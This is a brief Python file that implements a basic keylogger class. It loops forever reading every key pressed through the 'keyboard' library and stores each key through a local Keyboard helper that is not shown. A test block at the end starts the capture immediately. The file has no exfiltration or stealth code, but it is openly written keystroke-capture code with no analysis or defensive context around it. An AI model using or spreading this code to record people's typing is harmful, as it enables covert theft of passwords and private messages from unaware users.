import keyboard
from keys import Keyboard

class Keylogger:
	_keyboard = Keyboard()

	def __repr__(self):
		return "Instance of Keylogger"


	def runner(self):
		while True:
			pressed_key = keyboard.read_key()
			if not keyboard.is_pressed(pressed_key):
				self._keyboard.add(pressed_key)


# For tests
logger = Keylogger()
logger.runner()
